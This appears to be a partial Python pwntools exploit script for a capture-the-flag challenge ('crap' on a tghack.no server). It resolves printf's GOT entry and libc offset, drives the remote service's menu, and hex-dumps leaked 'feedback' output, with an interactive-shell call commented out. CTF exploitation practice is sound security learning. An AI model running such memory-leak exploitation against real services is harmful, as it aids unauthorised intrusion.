from pwn import *
import re

elf = ELF('crap')
libc = ELF('libc-2.31.so')
offset_printf = libc.symbols['printf']
addr_got_printf = elf.got['printf']

p = remote('crap.tghack.no', 6001)
print p.recvrepeat(0.2)
p.sendline('3')
print p.recvrepeat(0.2)
p.sendline('AAAAAAAA')
print p.recvrepeat(0.2)
p.sendline('n')

print p.recvrepeat(0.2)

p.sendline('4')

data = p.recvrepeat(1)
data = data.split('feedback: ')[1].split('\n')[0]

print data.encode('hex')


'''
print '#################'
print data
print '#################'

p.interactive()
'''
